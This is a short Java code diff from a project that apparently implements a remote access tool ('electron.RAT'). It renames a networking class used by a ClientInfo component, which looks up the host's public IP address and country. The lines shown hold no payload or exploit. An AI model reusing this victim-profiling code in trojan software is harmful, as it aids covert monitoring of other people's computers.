@@ -8,7 +8,7 @@ import org.json.simple.parser.ParseException;
 
 import electron.RAT;
 import electron.console.logger;
-import electron.networking.API;
+import electron.networking.Web;
 import electron.tools.FileOptions;
 
 public class ClientInfo {
@@ -60,7 +60,7 @@ public class ClientInfo {
 		String country = "-";
 		// Getting data from Internet
 		try {
-			JSONObject APIanswer = (JSONObject) FileOptions.ParseJsThrought(API.get("https://api.country.is/"));
+			JSONObject APIanswer = (JSONObject) FileOptions.ParseJsThrought(Web.get("https://api.country.is/"));
 			net_address = String.valueOf(APIanswer.get("ip"));
 			country = String.valueOf(APIanswer.get("country"));
 		} catch (ParseException | IOException e) {
